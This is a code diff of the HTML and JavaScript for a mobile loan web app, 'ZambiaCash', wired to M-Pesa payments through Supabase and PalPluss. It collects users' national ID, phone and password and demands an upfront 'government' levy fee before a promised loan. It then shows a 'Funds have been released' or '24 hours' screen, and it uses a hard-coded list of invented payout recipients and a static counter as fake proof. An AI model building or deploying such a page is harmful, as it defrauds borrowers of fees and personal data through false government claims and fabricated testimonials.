-              <path stroke-linecap="round" stroke-linejoin="round" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z" />
-            </svg>
-            <p class="text-[10px] text-blue-900 leading-snug">
-              <strong>Want a different loan amount?</strong> Tap any box below to change it. The levy duty stays the same.
-            </p>
-          </div>
-        </div>
-        <div id="confirmAmountBoxes" class="grid grid-cols-3 gap-1.5"></div>
-      </div>
-
-      <!-- PALPLUSS FUTURE DOUBLE-CONFIRM CARD -->
-      <div id="palplussConsentWrap" class="mt-4 bg-blue-50 border-2 border-blue-400 rounded-xl p-3 transition-colors">
-        <label class="flex items-start gap-3 cursor-pointer">
-          <input type="checkbox" id="palplussConsent" onchange="onPalplussCheckboxChange()" class="mt-0.5 w-5 h-5 accent-blue-600 flex-shrink-0" />
-          <div>
-            <p class="text-[10px] font-extrabold text-blue-900 uppercase tracking-wider leading-none">Step 1 of 2</p>
-            <p class="text-xs font-black text-blue-900 mt-1 leading-tight">
-              Payment goes to PALPLUSS FUTURE
-            </p>
-            <p class="text-[10px] text-blue-800 mt-1 leading-snug">
-              I understand the M-Pesa prompt and my statement will show <strong>PALPLUSS FUTURE</strong> as the recipient.
-            </p>
-          </div>
-        </label>
-        <button id="palplussConsentConfirmBtn" onclick="confirmPalplussConsent()" disabled class="mt-3 w-full bg-gray-200 text-gray-500 py-2.5 rounded-lg font-bold text-xs uppercase tracking-wide cursor-not-allowed transition-colors">
-          Step 2: Tap to Confirm
-        </button>
-      </div>
-
-      <!-- LIVE PAYOUTS TICKER -->
-      <div class="mt-3 bg-gradient-to-br from-emerald-50 to-teal-50 border-2 border-emerald-200 rounded-2xl p-3 shadow-sm">
-        <div class="flex items-center justify-between mb-2">
-          <div class="flex items-center gap-2">
-            <span class="w-2 h-2 rounded-full bg-emerald-500 dot-live"></span>
-            <p class="text-[10px] font-extrabold text-emerald-900 uppercase tracking-wider">Live payouts</p>
-          </div>
-          <p class="text-[10px] font-bold text-emerald-700">
-            <span id="proofTodayCount">347</span> today
-          </p>
-        </div>
-
-        <div class="relative h-12 overflow-hidden">
-          <div id="proofTicker" class="absolute inset-0 flex items-center">
-            <!-- filled by JS -->
-          </div>
-        </div>
-      </div>
-
-      <!-- ACTION BUTTONS -->
-      <div class="flex gap-3 mt-3">
-        <button onclick="closeConfirmPayment()" class="flex-1 bg-gray-100 text-gray-700 py-3 rounded-xl font-semibold text-sm">I'll Pay Later</button>
-        <button id="holdPayBtn"
-                class="relative flex-1 bg-gray-300 text-gray-500 py-3 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg cursor-not-allowed"
-                onclick="onMainPayBtnTap()"
-                disabled>
-          <span id="holdPayLabel" class="relative z-10 flex items-center justify-center gap-2 pointer-events-none">
-            <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-            </svg>
-            Complete both steps
-          </span>
-        </button>
-      </div>
-
-      <!-- AMOUNT CONFIRMATION SECTION (revealed after tapping main button) -->
-      <div id="amountConfirmSection" class="hidden mt-3">
-        <div class="bg-gradient-to-br from-red-50 to-orange-50 border-2 border-red-300 rounded-2xl p-4 shadow-md">
-          <div class="flex items-start gap-2.5 mb-3">
-            <div class="w-8 h-8 rounded-full bg-red-500 flex items-center justify-center flex-shrink-0">
-              <svg class="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-              </svg>
-            </div>
-            <div>
-              <p class="text-sm font-extrabold text-red-900 leading-tight">Final confirmation</p>
-              <p class="text-[11px] text-red-800 mt-1 leading-snug">
-                To prevent accidental payments, type the exact amount you are about to pay:
-              </p>
-            </div>
-          </div>
-
-          <div class="bg-white rounded-xl p-3 border border-red-200">
-            <p class="text-[10px] font-bold text-gray-500 uppercase tracking-wider">Type this amount below</p>
-            <p class="text-2xl font-extrabold text-gray-900 mt-1 font-mono" id="amountConfirmTarget">100</p>
-          </div>
-
-          <div class="mt-3">
-            <input
-              type="text"
-              inputmode="numeric"
-              id="amountConfirmInput"
-              oninput="onAmountConfirmInput()"
-              placeholder="Type amount here"
-              autocomplete="off"
-              class="w-full border-2 border-red-300 rounded-xl px-3 py-3 text-lg text-center font-mono font-bold outline-none focus:border-red-500 focus:ring-4 focus:ring-red-500/10 transition-colors" />
-            <p id="amountConfirmError" class="hidden mt-2 text-[11px] text-red-700 font-medium text-center"></p>
-          </div>
-
-          <div class="flex gap-2 mt-4">
-            <button onclick="cancelAmountConfirm()" class="flex-1 bg-white border border-gray-200 text-gray-700 py-3 rounded-xl font-semibold text-sm">Cancel</button>
-            <button id="amountConfirmSubmitBtn"
-                    onclick="submitAmountConfirmation()"
-                    disabled
-                    class="flex-[2] bg-gray-300 text-gray-500 py-3 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg cursor-not-allowed">
-              Pay Now
+        <div class="max-w-sm mx-auto w-full mb-6">
+            <button id="btn-close-tab" class="w-full bg-brandYellow text-gray-900 font-extrabold text-base py-4 rounded-full shadow-2xl active:scale-95 transition-transform mb-3 flex items-center justify-center gap-2">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M6 18L18 6M6 6l12 12"></path></svg>
+                Close Tab
             </button>
-          </div>
+            <button id="btn-use-browser" class="w-full bg-white/20 backdrop-blur text-white font-medium text-sm py-3 rounded-full border border-white/30 active:scale-95 transition-transform">
+                Continue in Browser
+            </button>
         </div>
-      </div>
     </div>
-  </div>
 
-  <!-- STK SENT VIEW -->
-  <div id="stkSentView" class="hidden min-h-screen w-full bg-gray-900/50 flex items-center justify-center p-5">
-    <div class="w-full max-w-xs bg-white rounded-3xl shadow-2xl p-6 text-center float-up-anim">
+    <!-- 4. APP SCREENS -->
+    <div id="app-content" class="hide font-sans">
 
-      <div class="relative inline-block mb-4">
-        <div class="pulse-ring-blue relative w-16 h-16 rounded-full bg-blue-50 border-2 border-blue-100 flex items-center justify-center mx-auto">
-          <svg class="w-8 h-8 text-blue-600 relative z-10 phone-wiggle" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
-          </svg>
+        <div id="screen-login" class="screen active gradient-bg p-6">
+            <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
+                <div class="text-center mb-8">
+                    <img src="icon.png" class="w-20 h-20 rounded-2xl mx-auto shadow-xl mb-4 object-cover" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxRTQwQUYiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1zaXplPSI0MCIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlo8L3RleHQ+PC9zdmc+'">
+                    <h1 class="text-white text-3xl font-extrabold">ZambiaCash</h1>
+                    <p class="text-blue-200 text-sm mt-1">Quick loans in minutes</p>
+                </div>
+                <div class="card">
+                    <h2 class="text-xl font-bold mb-4">Create Account</h2>
+                    <div class="space-y-3">
+                        <div><input type="text" id="in-name" placeholder="Full Name"></div>
+                        <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
+                        <div><input type="tel" id="in-mpesa" placeholder="M-Pesa (0712345678)"></div>
+                        <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
+                        <button onclick="submitLogin()" class="w-full bg-brandBlue text-white font-bold py-3.5 rounded-xl mt-2 shadow-lg active:scale-95 transition-transform">Create Account</button>
+                    </div>
+                    <p class="text-center text-xs text-slate-400 mt-4">🔒 Your data is encrypted and safe</p>
+                </div>
+            </div>
         </div>
-      </div>
 
-      <h2 class="text-lg font-extrabold text-gray-900 leading-tight">Check your phone</h2>
-      <p class="text-xs text-gray-500 mt-1">Enter your M-Pesa PIN to complete payment</p>
+        <div id="screen-checking" class="screen gradient-bg p-6 items-center justify-center">
+            <img src="icon.png" class="w-24 h-24 rounded-2xl mb-8 animate-pulse object-cover">
+            <h2 class="text-white text-2xl font-bold text-center mb-2">Checking your<br>loan limit</h2>
+            <p id="check-status" class="text-blue-200 text-sm mb-8">Analyzing your profile...</p>
+            <div class="w-full max-w-xs bg-blue-900/50 rounded-full h-3 mb-2">
+                <div id="check-bar" class="bg-brandYellow h-3 rounded-full transition-all duration-100" style="width: 0%"></div>
+            </div>
+            <p id="check-percent" class="text-white font-bold text-xl">0%</p>
+        </div>
 
-      <div class="mt-3 bg-blue-50 border border-blue-200 rounded-lg p-2.5">
-        <p class="text-[10px] text-blue-900 leading-snug">
-          The prompt and your statement will show <strong>PALPLUSS FUTURE</strong> as the recipient.
-        </p>
-      </div>
+        <div id="screen-select" class="screen bg-slate-50 p-6">
+            <div class="max-w-sm mx-auto w-full">
+                <h2 class="text-2xl font-extrabold mb-1">Choose your loan</h2>
+                <p class="text-sm text-slate-500 mb-6">Tap an amount, then choose a term</p>
+                <div class="grid grid-cols-3 gap-2 mb-6" id="amount-grid"></div>
+                <p class="font-bold text-sm mb-2">Repayment term</p>
+                <div class="flex gap-2 mb-6">
+                    <button onclick="setTerm(30)" class="term-btn selected flex-1 py-2 border-2 border-slate-200 rounded-lg font-bold text-sm">30 days</button>
+                    <button onclick="setTerm(60)" class="term-btn flex-1 py-2 border-2 border-slate-200 rounded-lg font-bold text-sm text-slate-600">60 days</button>
+                    <button onclick="setTerm(90)" class="term-btn flex-1 py-2 border-2 border-slate-200 rounded-lg font-bold text-sm text-slate-600">90 days</button>
+                </div>
+                <div class="card bg-white space-y-3 mb-6">
+                    <div class="flex justify-between"><span class="text-slate-500 text-sm">You receive</span><span id="sum-receive" class="font-bold text-brandBlue">Ksh 1,000</span></div>
+                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Interest (10%)</span><span id="sum-interest" class="font-bold">Ksh 100</span></div>
+                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Total repayment</span><span id="sum-total" class="font-bold text-green-600">Ksh 1,100</span></div>
+                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Due date</span><span id="sum-due" class="font-bold">--</span></div>
+                    <hr class="border-slate-100">
+                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Levy Duty (one-time)</span><span id="sum-levy" class="font-bold text-brandYellow">Ksh 150</span></div>
+                </div>
+                <button onclick="goToPayment()" class="w-full bg-brandBlue text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform">Continue</button>
+            </div>
+        </div>
 
-      <div class="mt-4 flex items-center justify-center gap-1.5">
-        <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 dot-fade" style="animation-delay:0s"></span>
-        <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 dot-fade" style="animation-delay:0.2s"></span>
-        <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 dot-fade" style="animation-delay:0.4s"></span>
-      </div>
+        <div id="screen-payment" class="screen bg-slate-50 p-6">
+            <div class="max-w-sm mx-auto w-full">
+                <div class="flex items-center gap-2 mb-4">
+                    <button onclick="showScreen('screen-select')" class="text-2xl font-bold text-brandBlue">&larr;</button>
+                    <h2 class="text-xl font-extrabold">Levy Duty Payment</h2>
+                </div>
+                <p class="text-sm text-slate-500 mb-6">Pay the government-mandated Levy Duty to activate your loan.</p>
+                <div class="card bg-white space-y-3 mb-4">
+                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Loan amount</span><span id="pay-loan" class="font-bold">Ksh 1,000</span></div>
+                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Interest</span><span id="pay-interest" class="font-bold">Ksh 100</span></div>
+                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Total repayment</span><span id="pay-total" class="font-bold text-green-600">Ksh 1,100</span></div>
+                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Due date</span><span id="pay-due" class="font-bold">--</span></div>
+                    <hr class="border-slate-100">
+                    <div class="flex justify-between items-center">
+                        <div>
+                            <span class="text-slate-500 text-sm block">Levy Duty (pay now)</span>
+                            <span class="text-[10px] text-slate-400">Government requirement</span>
+                        </div>
+                        <span id="pay-levy" class="font-extrabold text-brandYellow text-lg">Ksh 150</span>
+                    </div>
+                </div>
+                <div class="card bg-white mb-4">
+                    <p class="text-xs text-slate-500 mb-1">Account: <span id="pay-name" class="font-bold text-slate-800"></span></p>
+                    <label class="text-sm font-bold mb-1 block mt-3">M-Pesa Number</label>
+                    <input type="tel" id="pay-mpesa" placeholder="0712345678">
+                    <p class="text-[11px] text-slate-400 mt-1">Loan will be sent to this number</p>
+                </div>
+                <div class="bg-blue-50 text-blue-800 text-xs p-3 rounded-xl mb-6">
+                    ⚡ Your loan will be released to your M-Pesa immediately after fee payment.
+                </div>
+                <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform">Pay Ksh 150 Levy Duty</button>
+            </div>
+        </div>
 
-      <div id="stkCooldownWrap" class="mt-5">
-        <p class="text-[11px] text-gray-500">You can retry in <span id="stkCooldown" class="font-bold text-gray-800">60</span>s</p>
-      </div>
-
-      <p id="stkAttemptsWarn" class="hidden mt-2 text-[10px] text-red-600 font-bold text-center"></p>
-
-      <button id="stkRetryBtn" onclick="cancelStkAndRetry()" disabled class="mt-3 w-full bg-gray-100 text-gray-400 py-2.5 rounded-xl font-semibold text-xs cursor-not-allowed">
-        Didn't get the prompt? Try again
-      </button>
+        <div id="screen-success" class="screen bg-slate-50 p-6">
+            <div class="max-w-sm mx-auto w-full text-center mt-10">
+                <div id="verify-anim" class="mb-6">
+                    <div class="w-24 h-24 border-4 border-brandBlue border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+                    <h2 class="text-2xl font-extrabold">Verifying payment</h2>
+                    <p class="text-sm text-slate-500 mt-2">Please wait while we confirm with M-Pesa...</p>
+                    <p id="verify-time" class="text-brandYellow font-bold mt-4 text-lg">0s</p>
+                </div>
+                <div id="success-anim" class="hide">
+                    <div class="w-24 h-24 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-5xl">✓</div>
+                    <h2 class="text-2xl font-extrabold text-green-600">Loan Allocated!</h2>
+                    <p class="text-sm text-slate-500 mt-2 mb-6">Funds have been released to your M-Pesa immediately.</p>
+                    <div class="card bg-white text-left space-y-3 mb-6">
+                        <div class="flex justify-between"><span class="text-slate-500 text-sm">Loan Amount</span><span id="suc-loan" class="font-bold">Ksh 1,000</span></div>
+                        <div class="flex justify-between"><span class="text-slate-500 text-sm">Total Repayment</span><span id="suc-total" class="font-bold">Ksh 1,100</span></div>
+                        <div class="flex justify-between"><span class="text-slate-500 text-sm">Due Date</span><span id="suc-due" class="font-bold">--</span></div>
+                        <div class="flex justify-between"><span class="text-slate-500 text-sm">M-Pesa</span><span id="suc-mpesa" class="font-bold text-brandBlue"></span></div>
+                    </div>
+                    <button onclick="logout()" class="w-full bg-brandBlue text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform">Done</button>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <!-- PROCESSING VIEW -->
-  <div id="processingView" class="hidden min-h-screen w-full bg-gradient-to-br from-emerald-500 via-teal-600 to-emerald-800 flex items-center justify-center p-5 relative overflow-hidden">
-    <div class="absolute top-0 -left-20 w-72 h-72 rounded-full bg-yellow-300/20 blur-3xl"></div>
-    <div class="absolute bottom-0 -right-20 w-72 h-72 rounded-full bg-teal-300/20 blur-3xl"></div>
-
-    <div class="w-full max-w-md relative z-10">
-
-      <div class="text-center mb-6 success-bounce">
-        <div class="relative inline-block">
-          <div class="pulse-ring-light relative w-28 h-28 rounded-full bg-white flex items-center justify-center shadow-2xl mx-auto">
-            <svg class="w-14 h-14 text-emerald-600 relative z-10" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
-            </svg>
-          </div>
-        </div>
-        <h1 class="text-white text-3xl font-extrabold mt-6 tracking-tight drop-shadow-lg">Payment Successful!</h1>
-        <p class="text-emerald-50 text-sm mt-2 font-medium">Your levy duty has been received</p>
-      </div>
-
-      <div class="bg-white rounded-3xl shadow-2xl p-6 mb-4 float-up-anim">
-        <div class="text-center mb-4">
-          <div class="inline-flex items-center gap-2 bg-gradient-to-r from-yellow-100 to-amber-100 border border-yellow-300 text-yellow-800 px-4 py-1.5 rounded-full shadow-sm">
-            <span class="w-2 h-2 rounded-full bg-yellow-500 animate-pulse"></span>
-            <span class="text-[11px] font-extrabold uppercase tracking-wider">Processing Your Loan</span>
-          </div>
-        </div>
-
-        <p class="text-center text-sm text-gray-500 mb-2">Your loan will be availed in</p>
-        <div class="text-center">
-          <p class="text-5xl font-extrabold shine-text leading-none">24 HOURS</p>
-        </div>
-        <div class="mt-4 flex items-center justify-center gap-2 bg-emerald-50 border border-emerald-200 rounded-xl py-2.5 px-3">
-          <svg class="w-4 h-4 text-emerald-600 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
-          </svg>
-          <p class="text-[11px] text-emerald-800 font-medium">We'll send the money to your mobile wallet</p>
-        </div>
-      </div>
-
-      <div class="bg-white/95 backdrop-blur rounded-3xl shadow-xl p-5 mb-4 float-up-anim">
-        <h3 class="text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-3">Transaction Details</h3>
-
-        <div class="space-y-3">
-          <div class="flex justify-between items-center">
-            <span class="text-gray-500 text-xs">Receipt</span>
-            <span class="font-mono font-bold text-emerald-700 text-sm" id="procReceipt">&mdash;</span>
-          </div>
-          <div class="flex justify-between items-center border-t border-gray-100 pt-3">
-            <span class="text-gray-500 text-xs">Reference</span>
-            <span class="font-mono text-[11px] font-medium text-gray-800" id="procRef">&mdash;</span>
-          </div>
-          <div class="flex justify-between items-center border-t border-gray-100 pt-3">
-            <span class="text-gray-500 text-xs">Paid To</span>
-            <span class="font-semibold text-[11px] text-gray-800">PALPLUSS FUTURE</span>
-          </div>
-          <div class="flex justify-between items-center border-t border-gray-100 pt-3">
-            <span class="text-gray-500 text-xs">Loan Amount</span>
-            <div class="text-right">
-              <p class="font-bold text-sm text-gray-900" id="procAmount">&mdash;</p>
-              <p class="text-[10px] text-gray-400" id="procAmountKsh">&mdash;</p>
-            </div>
-          </div>
-          <div class="flex justify-between items-center border-t border-gray-100 pt-3">
-            <span class="text-gray-500 text-xs">Levy Duty Paid</span>
-            <div class="text-right">
-              <p class="font-medium text-sm text-gray-900" id="procFee">&mdash;</p>
-              <p class="text-[10px] text-gray-400" id="procFeeKsh">&mdash;</p>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div class="bg-yellow-50/95 backdrop-blur border border-yellow-300 rounded-2xl p-3.5 mb-4 flex items-start gap-3 shadow-lg">
-        <div class="w-8 h-8 rounded-full bg-yellow-400 flex items-center justify-center flex-shrink-0">
-          <svg class="w-4 h-4 text-yellow-900" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-          </svg>
-        </div>
-        <div>
-          <p class="text-xs font-bold text-yellow-900">Keep this receipt</p>
-          <p class="text-[11px] text-yellow-800 mt-0.5 leading-relaxed">You can use the reference number above to check your loan status anytime.</p>
-        </div>
-      </div>
-
-      <button onclick="showView('dashboardView')" class="w-full bg-white text-emerald-700 py-3.5 rounded-xl font-bold text-sm shadow-2xl active:scale-[0.98] transition-transform">
-        Back to Dashboard
-      </button>
+    <!-- TOAST -->
+    <div id="toast" class="hide fixed top-4 left-4 right-4 z-[10001] bg-slate-900 text-white text-sm p-4 rounded-xl shadow-2xl toast">
+        <p id="toast-msg"></p>
     </div>
-  </div>
 
-  <div id="toast" class="hidden fixed bottom-6 left-1/2 -translate-x-1/2 z-[200] bg-gray-900 text-white text-sm px-5 py-2.5 rounded-full shadow-lg pointer-events-none toast-anim"></div>
+    <!-- APP LOGIC -->
+    <script>
+        const SUPABASE_URL = "https://zpcbfaydgbhpjqsgfluv.supabase.co";
+        const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
+        const PALPLUSS_CHANNEL = "30dc7a92-7186-4686-b73d-c323138310c9";
+        const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
 
-  <script>
-    const SUPABASE_URL = 'https://zpcbfaydgbhpjqsgfluv.supabase.co';
-    const SUPABASE_ANON_KEY = 'sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ';
-    const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-    const SUPABASE_FUNCTIONS_URL = SUPABASE_URL + '/functions/v1';
-    const $ = (id) => document.getElementById(id);
+        let state = { name: "", id: "", mpesa: "", loan: 1000, levy: 150, term: 30, interest: 100, total: 1100 };
+        const amounts = [1000, 2000, 3000, 5000, 7500, 10000, 15000, 20000, 25000, 30000, 40000, 50000];
+        let pollTimer = null;
 
-    const ANNUAL_RATE = 15;
-    const MIN_LOAN = 500;
-    const FEE_MIN = 100;
-    const FEE_MAX = 100;
-    const FEE_RATE = 0;
-
-    const WITHDRAWAL_FEE = FEE_MIN;
-    const FLAT_LIMIT = 30000;
-    const PAY_BTN_LABEL = 'Withdraw';
-    const KSH_TO_ZMW = 0.2;
-    const STK_COOLDOWN_SECONDS = 60;
-
-    const AMOUNT_STEPS = [
-      1000, 3000, 5000, 7000, 9000,
-      11000, 13000, 15000, 17000, 19000,
-      21000, 25000, 30000
-    ];
-
-    const RECENT_PAYOUTS = [
-      { name: 'Peter Wanjiku',    phone: '0722***418',  amount: 15000, time: '2 min ago' },
-      { name: 'Mary Otieno',      phone: '0712***897',  amount: 8000,  time: '4 min ago' },
-      { name: 'James Wanyama',    phone: '0733***214',  amount: 20000, time: '6 min ago' },
-      { name: 'Grace Kipchoge',   phone: '0710***663',  amount: 5000,  time: '8 min ago' },
-      { name: 'John Mutua',       phone: '0745***091',  amount: 25000, time: '10 min ago' },
-      { name: 'Sarah Nyaboke',    phone: '0725***782',  amount: 12000, time: '12 min ago' },
-      { name: 'David Abdi',       phone: '0717***334',  amount: 10000, time: '14 min ago' },
-      { name: 'Esther Juma',      phone: '0728***556',  amount: 3000,  time: '16 min ago' },
-      { name: 'Daniel Saitoti',   phone: '0741***228',  amount: 18000, time: '18 min ago' },
-      { name: 'Ruth Mwenda',      phone: '0715***901',  amount: 7000,  time: '20 min ago' },
-      { name: 'Paul Wafula',      phone: '0738***347',  amount: 22000, time: '22 min ago' },
-      { name: 'Lucy Achieng',     phone: '0720***512',  amount: 15000, time: '24 min ago' },
-      { name: 'Michael Kimutai',  phone: '0748***873',  amount: 11000, time: '26 min ago' },
-      { name: 'Faith Mueni',      phone: '0713***245',  amount: 6000,  time: '28 min ago' },
-      { name: 'Samuel Barasa',    phone: '0727***618',  amount: 17000, time: '30 min ago' },
-      { name: 'Anne Wambui',      phone: '0734***952',  amount: 4000,  time: '32 min ago' },
-      { name: 'Joseph Owino',     phone: '0708***137',  amount: 23000, time: '34 min ago' },
-      { name: 'Mercy Chepkoech',  phone: '0746***481',  amount: 9000,  time: '36 min ago' }
-    ];
-
-    let tickerIndex = 0;
-    let tickerTimer = null;
-    let todayCount = 347;
-
-    const fmt = (n) => {
-      const num = Number(n || 0);
-      const isWhole = Number.isInteger(num);
-      const opts = isWhole
-        ? { minimumFractionDigits: 0, maximumFractionDigits: 0 }
-        : { minimumFractionDigits: 2, maximumFractionDigits: 2 };
-      return 'KSh ' + num.toLocaleString('en-KE', opts);
-    };
-
-    const fmtZMW = (ksh) => {
-      const zmw = Math.round(Number(ksh || 0) * KSH_TO_ZMW);
-      return 'ZMW ' + zmw.toLocaleString('en-US');
-    };
-
-    const spinner = (hex = '#047857') =>
-      `<span class="spinner" style="border-color:${hex}22;border-top-color:${hex}"></span>`;
-
-    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
-    const esc = (s) => String(s ?? '').replace(/[&<>"']/g, c =>
-      ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
-
-    function showPayError(message, opts = {}) {
-      const result = $('payResult');
-      const retryLabel = opts.retryLabel || 'Retry';
-      result.className = 'mt-4 p-4 rounded-2xl text-sm bg-red-50 border border-red-200 text-red-900';
-      result.innerHTML = `
-        <p class="font-medium">${esc(message)}</p>
-        <button onclick="initiatePayment()" class="mt-3 w-full bg-red-600 text-white py-2.5 rounded-lg font-semibold text-sm active:scale-[0.98] transition-transform">
-          ${esc(retryLabel)}
-        </button>
-      `;
-      result.classList.remove('hidden');
-      showToast(message, { variant: 'error' });
-    }
-
-    function normalizePhone(input) {
-      let p = String(input || '').replace(/\D/g, '');
-      if (p.startsWith('0')) p = '254' + p.slice(1);
-      if (p.startsWith('7') || p.startsWith('1')) p = '254' + p;
-      return p;
-    }
-    function phoneToEmail(phone) { return normalizePhone(phone) + '@zamcash.co.ke'; }
-    function isValidKePhone(input) {
-      const p = normalizePhone(input);
-      return p.startsWith('254') && p.length === 12;
-    }
-    function formatPhoneDisplay(input) {
-      const p = normalizePhone(input);
-      if (p.length !== 12) return input;
-      return `+${p.slice(0, 3)} ${p.slice(3, 6)} ${p.slice(6, 9)} ${p.slice(9)}`;
-    }
-    function phoneFromEmail(email) {
-      if (!email) return '';
-      return normalizePhone(String(email).split('@')[0]);
-    }
-
-    let toastTimer = null;
-    function showToast(message, opts = {}) {
-      const el = $('toast');
-      const bg = opts.variant === 'error'
-        ? 'bg-red-600'
-        : opts.variant === 'warning'
-          ? 'bg-yellow-500'
-          : 'bg-gray-900';
-      el.className = `fixed bottom-6 left-1/2 -translate-x-1/2 z-[200] ${bg} text-white text-sm px-5 py-2.5 rounded-full shadow-lg pointer-events-none font-medium`;
-      el.textContent = message;
-      void el.offsetWidth;
-      el.classList.add('toast-anim');
-      clearTimeout(toastTimer);
-      toastTimer = setTimeout(() => {
-        el.className = 'hidden fixed bottom-6 left-1/2 -translate-x-1/2 z-[200] bg-gray-900 text-white text-sm px-5 py-2.5 rounded-full shadow-lg pointer-events-none toast-anim';
-      }, 3200);
-    }
-
-    let currentUser = null;
-    let currentProfile = null;
-    let currentApp = null;
-    let selectedAmountFromLanding = null;
-    let wizardSelectedAmount = null;
-    let pendingApplication = null;
-    let loginReturnView = 'landingView';
-    let paymentSource = 'dashboard';
-    let pollToken = 0;
-    let confirmSelectedAmount = null;
-    let stkCooldownTimer = null;
-    let palplussConsentConfirmed = false;
-    let amountConfirmRevealed = false;
-
-    const views = ['landingView', 'loginView', 'statusView', 'applyWizardView', 'eligibilityView', 'dashboardView', 'offerView', 'paymentView', 'stkSentView', 'processingView'];
-    function showView(id) {
-      views.forEach(v => $(v).classList.add('hidden'));
-      $(id).classList.remove('hidden');
-      window.scrollTo(0, 0);
-    }
-
-    function eligibility(amount) {
-      if (amount < MIN_LOAN) return { eligible: false, reason: `Minimum loan amount is ${fmtZMW(MIN_LOAN)}.`, maxLoan: FLAT_LIMIT };
-      if (amount > FLAT_LIMIT) return { eligible: false, reason: `Maximum loan amount is ${fmtZMW(FLAT_LIMIT)}.`, maxLoan: FLAT_LIMIT };
-      return { eligible: true, maxLoan: FLAT_LIMIT };
-    }
-
-    function processingFee(loanAmount) {
-      const amt = Number(loanAmount || 0);
-      if (!amt) return { fee: FEE_MIN, total: FEE_MIN };
-      const raw = Math.round(amt * FEE_RATE);
-      const fee = Math.min(FEE_MAX, Math.max(FEE_MIN, raw));
-      return { fee, total: fee };
-    }
-
-    function calcEmi(principal, months, annualRate = ANNUAL_RATE) {
-      const r = annualRate / 12 / 100;
-      return (principal * r * Math.pow(1 + r, months)) / (Math.pow(1 + r, months) - 1);
-    }
-
-    const makeRefNo = () => 'ZC' + Date.now().toString().slice(-8) + Math.floor(Math.random() * 90 + 10);
-
-    function startStkCooldown(seconds = STK_COOLDOWN_SECONDS) {
-      clearInterval(stkCooldownTimer);
-      let remaining = seconds;
-      const countdownEl = $('stkCooldown');
-      const retryBtn = $('stkRetryBtn');
-      const wrap = $('stkCooldownWrap');
-      if (!countdownEl || !retryBtn || !wrap) return;
-
-      countdownEl.textContent = remaining;
-      retryBtn.disabled = true;
